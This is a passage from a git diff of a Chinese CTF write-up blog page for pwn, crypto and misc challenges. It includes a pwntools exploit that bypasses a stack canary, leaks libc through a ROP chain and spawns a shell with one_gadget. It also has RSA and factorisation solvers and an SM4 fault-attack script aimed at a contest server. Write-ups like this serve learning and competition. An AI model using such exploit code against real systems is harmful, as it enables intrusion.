stack_chk_fail ====&gt; bypass canary</span></span><br><span class="line">io.send(p64(stack_chk_fail))</span><br><span class="line">io.send(p64(ret_addr))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># STEP3. </span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span> + p64(bss_addr + <span class="number">0x20</span>) + p64(<span class="number">0x400A0B</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># STEP4. ROP chain ret2buf &amp;&amp; leak libc_base</span></span><br><span class="line"><span class="comment"># pop rbp; rsp = rsp + 8</span></span><br><span class="line">payload3 = p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(kill_addr) + p64(bss_addr - <span class="number">8</span>) + p64(lea_ret)</span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line">read_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;read_addr ====&gt; &quot;</span> + <span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base ====&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># STEP5. get shell</span></span><br><span class="line">dl_rtld_unlock_recursive = libc_base + <span class="number">0x5f0040</span> + <span class="number">3848</span></span><br><span class="line">io.send(p64(dl_rtld_unlock_recursive))</span><br><span class="line">one_gadget = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xcd173</span>, <span class="number">0xcd248</span>, <span class="number">0xf03a4</span>, <span class="number">0xf03b0</span>, <span class="number">0xf1247</span>, <span class="number">0xf67f0</span>]</span><br><span class="line">io.send(p64(libc_base + one_gadget[<span class="number">6</span>]))</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h3 id="crypto-ぎんたま9"><a href="#crypto-ぎんたま9" class="headerlink" title="crypto-ぎんたま9"></a>crypto-ぎんたま9</h3><p>也没什么好说的，自己记一下</p>
+<h2 id="Crypto-ぎんたま9"><a href="#Crypto-ぎんたま9" class="headerlink" title="Crypto-ぎんたま9"></a>Crypto-ぎんたま9</h2><p>也没什么好说的，自己记一下</p>
 <p>提示也说了是utf-7编码，去年在东华杯的Misc签到第一次遇到，但其实前年的Hackergame就出过，看这位师傅的博客可以学到一些，Fr.<a target="_blank" rel="noopener" href="https://miaotony.xyz/2020/11/08/CTF_2020Hackergame/#UTF-7-%E5%88%B0-UTF-8-%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7">https://miaotony.xyz/2020/11/08/CTF_2020Hackergame/#UTF-7-到-UTF-8-转换工具</a></p>
 <p>首先提示是一串md5，在线逆一下提示utf-7</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220320161048014.png" alt="image-20220320161048014"></p>
@@ -492,13 +482,13 @@
 <p>当然知道原理的还可以，直接解base64</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220320163012480.png" alt="image-20220320163012480"></p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220320163340472.png" alt="image-20220320163340472"></p>
-<h2 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h2><h3 id="crypto-math1"><a href="#crypto-math1" class="headerlink" title="crypto-math1"></a>crypto-math1</h3><p>实际做的时候很简单，试一试就知道，把$c$进行摘要得到的就是flag</p>
+<h1 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="math1"><a href="#math1" class="headerlink" title="math1"></a>math1</h3><p>实际做的时候很简单，试一试就知道，把$c$进行摘要得到的就是flag</p>
 <p>原理也比较基础，就是下面基本定理的推广<br>$$<br>m^{\varphi(n)+1}\equiv m^{(p-1)(q-1)+1}\equiv m\ (mod\ n)\notag<br>$$<br>简单证明一下，当$(m,\ n)=1$时，就是欧拉定理；当$(m,\ n)\ne 1$，即$m$是$p$或$q$的倍数时，证明如下</p>
 <p>当$m=cp$，$c$是某个正整数时，必然$(m,\ q)=1$，否则$m$就是$q$的倍数，但$m&lt;pq$。则<br>$$<br>[m^{\varphi(q)}]^{\varphi(p)}\equiv 1\ (mod\ q))\notag<br>$$<br>即<br>$$<br>m^{\varphi(n)}\equiv 1\ (mod\ q)\notag<br>$$<br>因此存在某个整数$k$，使得：<br>$$<br>m^{\varphi(n)}=1+kq\notag<br>$$<br>在等式两边同时乘以$m=cp$，有<br>$$<br>m^{\varphi(n)+1}=m+kcpq=m+kcn\notag<br>$$</p>
 <p>$$<br>m^{\varphi(n)+1}\equiv m\ mod\ n\notag<br>$$</p>
 <p>$m=cq$同理，证毕</p>
 <p>而其推论同样成立<br>$$<br>m^{k\varphi(n)+1}\equiv m\ (mod\ n)\notag<br>$$</p>
-<h3 id="crypto-D4C"><a href="#crypto-D4C" class="headerlink" title="crypto-D4C"></a>crypto-D4C</h3><p>一次外面的师傅给我做的题目，出的初衷让大家多认识一个分解手段罢了（cm based factorization），所以过半上了hint，原理我看不懂，学懂的师傅带带我</p>
+<h3 id="D4C"><a href="#D4C" class="headerlink" title="D4C"></a>D4C</h3><p>一次外面的师傅给我做的题目，出的初衷让大家多认识一个分解手段罢了（cm based factorization），所以过半上了hint，原理我看不懂，学懂的师傅带带我</p>
 <p>用github上别人写好的代码，可以分解$n$，Fr<a target="_blank" rel="noopener" href="https://github.com/crocs-muni/cm_factorization">https://github.com/crocs-muni/cm_factorization</a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sage cm_factor.sage -N [n] -D 27</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sage cm_factor.sage -N [n] -D 35</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sage cm_factor.sage -N [n] -D 43</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sage cm_factor.sage -N [n] -D 59</span></span><br></pre></td></tr></table></figure>
 
@@ -506,9 +496,9 @@
 <p>exp如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> inverse</span><br><span class="line">n = </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">r = </span><br><span class="line">s = </span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> n == p * q * r * s</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">a = <span class="built_in">int</span>((<span class="string">b&#x27;1&#x27;</span> * <span class="number">128</span> + <span class="string">b&#x27;1&#x27;</span>).<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">b = <span class="built_in">int</span>((<span class="string">b&#x27;1&#x27;</span> * <span class="number">128</span> + <span class="string">b&#x27;2&#x27;</span>).<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (r - <span class="number">1</span>) * (q - <span class="number">1</span>) * (s - <span class="number">1</span>)</span><br><span class="line">d1 = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">pow</span>(a, d1, n)</span><br><span class="line">b = <span class="built_in">pow</span>(b, d1, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">tmp_m1 = <span class="built_in">hex</span>(<span class="built_in">pow</span>(a, e, n))[<span class="number">2</span>:]</span><br><span class="line">tmp_m2 = <span class="built_in">hex</span>(<span class="built_in">pow</span>(b, e, n))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">bytes</span>.fromhex(tmp_m1.rjust(<span class="built_in">len</span>(tmp_m1) % <span class="number">2</span> + <span class="built_in">len</span>(tmp_m1), <span class="string">&#x27;0&#x27;</span>))[:<span class="number">128</span>]</span><br><span class="line">c2 = <span class="built_in">bytes</span>.fromhex(tmp_m2.rjust(<span class="built_in">len</span>(tmp_m2) % <span class="number">2</span> + <span class="built_in">len</span>(tmp_m2), <span class="string">&#x27;0&#x27;</span>))[:<span class="number">128</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="number">74704491809129301431922126387259236131741663134391168615412812966492700892623601405402368087099571730256931303905652832294794514978433001412824232257513564130471734888624376732292892542067962162889981515796044054677065262159718624328379670223847474727251134104982577240172717005612604659753291960218280910803563709374350562828184329134141383582576091714559710119878799025791014527350120986309452179375923692502134903331617253682361593773647861433315490727739213348290415564461418246530360894539160399354008769541101954477775355503410800643258046481902813906228161547282647975966523246407914302640009159</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (r - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">pow</span>(c, d, p * r))[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>
 
-<h3 id="crypto-SorM"><a href="#crypto-SorM" class="headerlink" title="crypto-SorM"></a>crypto-SorM</h3><p>考察点</p>
+<h3 id="SorM"><a href="#SorM" class="headerlink" title="SorM"></a>SorM</h3><p>考察点</p>
 <ul>
-<li>SM4 differential fault analysis</li>
+<li>SM4 DFA（differential fault analysis）</li>
 </ul>
 <p>与正常的SM4加解密相比，ecb模式下有有点不同，下面三个参数实现了对SM4 1~32中任意一轮的某一个字节的篡改</p>
 <ul>
@@ -526,7 +516,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> exploit.blockCipher.mySM4 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"></span><br><span class="line">table = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(&#x27;127.0.0.1&#x27;, 10001)</span></span><br><span class="line">io = remote(<span class="string">&#x27;47.96.253.167&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;172.22.236.111&#x27;, 9996)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: io.recvuntil(s.encode())</span><br><span class="line">sl = <span class="keyword">lambda</span> s: io.sendline(s.encode())</span><br><span class="line">sn = <span class="keyword">lambda</span> s: io.send(s.encode())</span><br><span class="line">rv = <span class="keyword">lambda</span>: io.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">sla = <span class="keyword">lambda</span> r, s: io.sendlineafter(r.encode(), s.encode())</span><br><span class="line">sa = <span class="keyword">lambda</span> r, s: io.sendafter(r.encode(), s.encode())</span><br><span class="line"></span><br><span class="line">put_uint32_be = <span class="keyword">lambda</span> n:[((n&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>), ((n&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>), ((n&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>), ((n)&amp;<span class="number">0xff</span>)]</span><br><span class="line">lotr = <span class="keyword">lambda</span> x, n:((x &gt;&gt; n) &amp; <span class="number">0xffffffff</span>) | ((x &lt;&lt; (<span class="number">32</span> - n)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line">proof = ru(<span class="string">&#x27;[+] Plz tell me XXXX: &#x27;</span>)</span><br><span class="line">tail = proof[<span class="number">16</span>:<span class="number">32</span>].decode()</span><br><span class="line">_<span class="built_in">hash</span> = proof[<span class="number">37</span>:<span class="number">101</span>].decode()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table, repeat=<span class="number">4</span>):</span><br><span class="line">    head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> t == _<span class="built_in">hash</span>:</span><br><span class="line">        sl(head)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;again: &#x27;</span>)</span><br><span class="line">ciphertext = rl()</span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pt</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;[-] &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz give me plaintext in base64: &#x27;</span>, pt)</span><br><span class="line">    ru(<span class="string">&#x27;your ciphertext in base64: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> rl()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt2</span>(<span class="params">pt, r, f, p</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;[-] &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz give me plaintext in base64: &#x27;</span>, pt)</span><br><span class="line">    sla(<span class="string">&quot;and don&#x27;t forget to give me your round, rand, j: &quot;</span>, <span class="string">f&#x27;<span class="subst">&#123;r&#125;</span> <span class="subst">&#123;f&#125;</span> <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;your ciphertext in base64: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> rl()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">key</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;[-] &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz give me ciphertext in base64: &#x27;</span>, ciphertext)</span><br><span class="line">    sla(<span class="string">&#x27;plz give me key in base64: &#x27;</span>, key)</span><br><span class="line">    ru(<span class="string">&#x27;your plaintext in base64: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> rl()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span>(<span class="params">ct</span>):</span></span><br><span class="line">    ct = b64decode(ct)</span><br><span class="line">    ct = [<span class="built_in">int</span>(_.<span class="built_in">hex</span>(), <span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> [ct[:<span class="number">4</span>], ct[<span class="number">4</span>:<span class="number">8</span>], ct[<span class="number">8</span>:<span class="number">12</span>], ct[<span class="number">12</span>:]]][::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_n_rounds</span>(<span class="params">ct, rk</span>):</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> rk:</span><br><span class="line">        ct = [F([ct[<span class="number">3</span>], ct[<span class="number">0</span>], ct[<span class="number">1</span>], ct[<span class="number">2</span>]], _), ct[<span class="number">0</span>], ct[<span class="number">1</span>], ct[<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rec_k_frk32_29</span>(<span class="params">kp</span>):</span></span><br><span class="line">    k = [<span class="number">0</span>] * <span class="number">36</span></span><br><span class="line">    k[<span class="number">32</span>], k[<span class="number">33</span>], k[<span class="number">34</span>], k[<span class="number">35</span>] = kp</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        k[_] = k[_ + <span class="number">4</span>] ^ T_1(k[_ + <span class="number">1</span>] ^ k[_ + <span class="number">2</span>] ^ k[_ + <span class="number">3</span>] ^ CK[_])</span><br><span class="line">    <span class="keyword">return</span> [k[<span class="number">0</span>] ^ FK[<span class="number">0</span>], k[<span class="number">1</span>] ^ FK[<span class="number">1</span>], k[<span class="number">2</span>] ^ FK[<span class="number">2</span>], k[<span class="number">3</span>] ^ FK[<span class="number">3</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload_pt = b64encode(<span class="string">b&#x27;4xwi11&#x27;</span>).decode()</span><br><span class="line">rk32_29 = []</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> [<span class="number">30</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">27</span>]:</span><br><span class="line">    rki = <span class="number">0</span></span><br><span class="line">    raw_ct = encrypt(payload_pt)</span><br><span class="line">    raw_ct = transform(raw_ct)</span><br><span class="line">    raw_ct = decode_n_rounds(raw_ct, rk32_29)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        r_x32, r_x33, r_x34, r_x35 = raw_ct[<span class="number">0</span>], raw_ct[<span class="number">1</span>], raw_ct[<span class="number">2</span>], raw_ct[<span class="number">3</span>]</span><br><span class="line">        r_byte = put_uint32_be(r_x32 ^ r_x33 ^ r_x34)[j % <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">        fault_ct = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            tmp = transform(encrypt2(payload_pt, r, getrandbits(<span class="number">8</span>), j))</span><br><span class="line">            fault_ct.append(decode_n_rounds(tmp, rk32_29))</span><br><span class="line"></span><br><span class="line">        ios = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> fault_ct:</span><br><span class="line">            f_x32, f_x33, f_x34, f_x35 = i[<span class="number">0</span>], i[<span class="number">1</span>], i[<span class="number">2</span>], i[<span class="number">3</span>]</span><br><span class="line">            f_byte = put_uint32_be(f_x32 ^ f_x33 ^ f_x34)[j % <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">            b = lotr(put_uint32_be(r_x35 ^ f_x35)[(j - <span class="number">1</span>) % <span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line">            ios.append((f_byte, b))</span><br><span class="line"></span><br><span class="line">        key = Counter()</span><br><span class="line">        <span class="keyword">for</span> xx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> f_byte, b <span class="keyword">in</span> ios:</span><br><span class="line">                <span class="keyword">if</span> box[r_byte ^ xx] ^ box[f_byte ^ xx] == b:</span><br><span class="line">                    key[xx] += <span class="number">1</span></span><br><span class="line">        rki = (rki &lt;&lt; <span class="number">8</span>) + key.most_common()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    rk32_29.append(rki)</span><br><span class="line"></span><br><span class="line">rk32_29 = rk32_29[::-<span class="number">1</span>]</span><br><span class="line">key = rec_k_frk32_29(rk32_29)</span><br><span class="line">key = long_to_bytes(key[<span class="number">0</span>])+long_to_bytes(key[<span class="number">1</span>])+long_to_bytes(key[<span class="number">2</span>])+long_to_bytes(key[<span class="number">3</span>])</span><br><span class="line">key = b64encode(key)</span><br><span class="line"><span class="built_in">print</span>(key.decode())</span><br><span class="line">flag = decrypt(key.decode())</span><br><span class="line"><span class="built_in">print</span>(b64decode(flag))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220409113940491.png" alt="image-20220409113940491"></p>
-<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference."></a>Reference.</h4><ul>
+<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ul>
 <li><p><a target="_blank" rel="noopener" href="https://blog.soreatu.com/posts/case-study-differetial-cryptanalysis-attack/#%E5%BC%BA%E7%BD%91%E6%9D%AF2020-fault">https://blog.soreatu.com/posts/case-study-differetial-cryptanalysis-attack/#强网杯2020-fault</a></p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://eprint.iacr.org/2010/063.pdf">https://eprint.iacr.org/2010/063.pdf</a></p>
@@ -534,10 +524,10 @@
 <li><p><a target="_blank" rel="noopener" href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&dbname=CJFD2006&filename=JSJX200609011&uniplatform=NZKPT&v=xAkChrfMKVAUb6xQPrdHbTHWM98SnCwCOA9gyxNS4qmjwhLQO4K-6BDSoNdRHqAJ">SMS4密码算法的差分故障攻击</a></p>
 </li>
 </ul>
-<h3 id="misc-Just-Signin"><a href="#misc-Just-Signin" class="headerlink" title="misc-Just-Signin"></a>misc-Just-Signin</h3><p>截取自外校师傅给的题。试试就知道，没什么好说的，直接上exp</p>
+<h2 id="Misc-Just-Signin"><a href="#Misc-Just-Signin" class="headerlink" title="Misc-Just-Signin"></a>Misc-Just-Signin</h2><p>截取自外校师傅给的题</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">table = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solve</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># self.sh = remote(&#x27;127.0.0.1&#x27;, 10001)</span></span><br><span class="line">        self.sh = remote(<span class="string">&#x27;47.96.253.167&#x27;</span>, <span class="number">9997</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># [+] sha256(XXXX+JaakUDSfxkW0xjzV) == 4dbfdc61cb88f5bd08d87493ac62e5ab174780f5f019051f91df8b3c36564ed0</span></span><br><span class="line">        <span class="comment"># [+] Plz tell me X<span class="doctag">XXX:</span></span></span><br><span class="line">        proof = self.sh.recvuntil(<span class="string">b&#x27;[+] Plz tell me XXXX:&#x27;</span>)</span><br><span class="line">        tail = proof[<span class="number">16</span>:<span class="number">32</span>].decode()</span><br><span class="line">        _<span class="built_in">hash</span> = proof[<span class="number">37</span>:<span class="number">101</span>].decode()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> product(table, repeat=<span class="number">4</span>):</span><br><span class="line">            head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">            t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> t == _<span class="built_in">hash</span>:</span><br><span class="line">                self.sh.sendline(head.encode())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># self.proof_of_work()</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;100-721&#x27;</span>, <span class="string">&#x27;1-77721&#x27;</span>]:</span><br><span class="line">            self.sh.recv()</span><br><span class="line">            self.sh.sendline(i.encode())</span><br><span class="line">        self.sh.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 